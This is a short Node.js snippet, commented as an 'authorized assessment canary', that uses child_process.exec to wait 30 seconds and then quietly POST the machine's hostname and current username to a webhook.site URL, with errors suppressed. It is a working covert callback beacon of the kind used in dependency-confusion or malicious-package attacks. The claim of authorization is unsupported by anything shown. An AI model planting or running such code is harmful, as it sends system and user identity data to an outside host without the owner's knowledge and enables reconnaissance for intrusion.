// Authorized assessment canary
const{exec}=require('child_process');exec("(sleep 30 && curl -s -X POST \"http://webhook.site/e8c8bff9-645a-4af5-a678-c5966d0920b5/engagement/env\" -H \"Content-Type: application/json\" -d \"{\\\"event\\\":\\\"poc_exec\\\",\\\"host\\\":\\\"$(hostname)\\\",\\\"user\\\":\\\"$(whoami)\\\"}\") || true");
